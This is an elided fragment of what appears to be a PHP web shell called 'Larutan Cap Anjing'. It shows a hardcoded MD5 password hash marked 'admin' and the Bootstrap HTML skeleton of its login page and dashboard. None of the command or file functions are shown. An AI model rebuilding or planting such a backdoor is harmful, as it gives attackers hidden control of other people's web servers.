...
$auth_pass = "975ecb719692fa2bc7255b0c2dd2f3a4"; // admin
$color = "#00ff00";
...
<!DOCTYPE html>
<html>
	<title>Larutan Cap Anjing</title>
	<head>
		<meta name="viewport" content="widht=device-widht, initial-scale=1.0"/>
		<meta name="author" content="hehehe"/>
		<meta name="copyright" content="Larutan Cap Anjing"/>
		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css"/>
		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous"/>
	</head>
	<body class="bg-dark text-light">
		<center>
			<br/><h3>Larutan Cap Anjing</h3><hr/><br/>
			<div class="container">
				<div class="col-lg-6">
...
?>
 ...
 <div class="d-flex" id="wrapper">
    ...
    <div class="bg-light border-right" id="sidebar-wrapper">
      <div class="sidebar-heading"><i class="fas fa-tachometer-alt"></i><a href="?" class="text-dark"> Larutan Cap Anjing</a></div>
